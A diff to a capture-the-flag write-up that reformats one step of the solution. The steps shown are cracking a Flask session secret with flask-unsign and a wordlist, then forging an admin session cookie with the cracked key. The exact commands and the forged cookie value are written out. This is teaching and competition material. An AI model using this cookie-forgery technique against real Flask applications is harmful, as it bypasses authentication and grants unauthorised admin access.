@@ -89,7 +89,11 @@ C:\Users\sunik>flask-unsign --wordlist C:\Users\sunik\OneDrive\Documents\Picture
 ```  
 which gave me the secret key as `b'fortune'`.  
 ![Screenshot 2024-11-01 181531](https://github.com/user-attachments/assets/1be8c1c0-960e-488b-b818-8389b94db8ea)  
-After this, I used another command to generate a new cookie which contains the necessary request i.e `{"very_auth":"admin}` using `C:\Users\sunik>flask-unsign --sign --cookie {'very_auth':'admin'} --secret 'fortune'` which gave me the new cookie as `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZyTOmQ.KBIkUcdk2bRKSjPzJ1H3_aRCwJM`.  
+After this, I used another command to generate a new cookie which contains the necessary request i.e `{"very_auth":"admin}` using 
+```
+C:\Users\sunik>flask-unsign --sign --cookie {'very_auth':'admin'} --secret 'fortune'
+```
+which gave me the new cookie as `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZyTOmQ.KBIkUcdk2bRKSjPzJ1H3_aRCwJM`.  
 Then, I simply submitted this cookie and damn g, the flag was right in front of us!  
 ![Screenshot 2024-11-01 183101](https://github.com/user-attachments/assets/5a35f853-4ce7-468c-b1d3-fab754d3fc2f)  
 
